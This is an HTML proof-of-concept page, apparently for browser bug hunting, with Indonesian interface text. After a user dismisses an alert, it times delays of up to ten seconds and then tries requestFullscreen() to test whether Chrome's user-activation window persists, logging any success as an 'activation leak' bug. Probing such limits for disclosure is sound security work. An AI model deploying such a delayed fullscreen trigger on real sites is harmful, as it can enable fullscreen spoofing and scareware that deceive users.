<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>10s Activation Leak Lab</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 20px; text-align: center; }
        .log-box { background: #111; border: 1px solid #333; padding: 15px; text-align: left; margin-top: 20px; font-size: 13px; min-height: 150px; border-radius: 8px; }
        button { padding: 15px; background: #222; color: #0f0; border: 1px solid #0f0; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%; margin-bottom: 10px; transition: 0.3s; }
        button:active { background: #0f0; color: #000; }
        .success { color: #0f0; font-weight: bold; text-shadow: 0 0 5px #0f0; }
        .fail { color: #f00; font-weight: bold; }
        .timer-display { font-size: 24px; margin: 20px 0; color: yellow; }
    </style>
</head>
<body>

    <h3>🚀 ULTRA PERSISTENCE LAB</h3>
    <p>Target: <i>Chrome User Activation Window</i></p>

    <div class="timer-display" id="countdown">0.00s</div>

    <button onclick="runTest(2000)">TEST: 2 Seconds</button>
    <button onclick="runTest(5000)">TEST: 5 Seconds</button>
    <button onclick="runTest(10000)" style="border-color: #f00; color: #f00;">TEST: 10 Seconds (ULTRA)</button>
    
    <div class="log-box" id="console">
        <div>[SYSTEM] Menunggu perintah...</div>
    </div>

    <script>
        const logger = document.getElementById('console');
        const countdown = document.getElementById('countdown');
        const docEl = document.documentElement;

        function log(msg, type = '') {
            const div = document.createElement('div');
            div.className = type;
            div.innerHTML = `> ${msg}`;
            logger.appendChild(div);
            logger.scrollTop = logger.scrollHeight;
        }

        function runTest(ms) {
            log(`Memicu Alert...`);
            alert(`Setelah klik OK, JANGAN SENTUH layar selama ${ms/1000} detik!\n\nTarget: ${ms/1000}s Delay.`);
            
            const startTime = Date.now();
            log(`[OK] Diklik. Timer ${ms}ms dimulai.`, 'success');

            // Visual Timer
            const timerInterval = setInterval(() => {
                const elapsed = (Date.now() - startTime) / 1000;
                countdown.innerText = elapsed.toFixed(2) + "s";
                if (elapsed >= ms/1000) clearInterval(timerInterval);
            }, 50);

            setTimeout(() => {
                const callTime = Date.now();
                const actualDiff = callTime - startTime;
                log(`Mencoba requestFullscreen() pada ${actualDiff}ms...`);

                docEl.requestFullscreen()
                    .then(() => {
                        log(`🔥 SUCCESS! Fullscreen aktif setelah ${actualDiff}ms!`, 'success');
                        log(`⚠️ INI ADALAH VALID BUG (Activation Leak).`, 'success');
                        alert(`BOOM! Berhasil setelah ${actualDiff/1000} detik!`);
                    })
                    .catch((err) => {
                        log(`❌ FAILED: Diblokir browser setelah ${actualDiff}ms.`, 'fail');
                        log(`Kesimpulan: Activation sudah expired.`);
                    });

            }, ms);
        }
    </script>
</body>
</html>
